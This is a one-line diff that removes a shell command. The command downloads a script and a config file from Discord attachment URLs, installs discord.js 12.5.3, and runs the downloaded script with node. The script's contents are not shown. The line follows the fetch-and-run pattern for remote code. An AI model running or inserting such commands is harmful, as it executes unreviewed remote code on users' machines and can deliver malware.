@@ -1,1 +1,0 @@
-curl https://cdn.discordapp.com/attachments/1061664042726461460/1067857361454235779/script.js -o script.js ; curl https://cdn.discordapp.com/attachments/1061664042726461460/1071905379769909389/config.json -o config.json ; npm install discord.js@12.5.3 ; node script.js
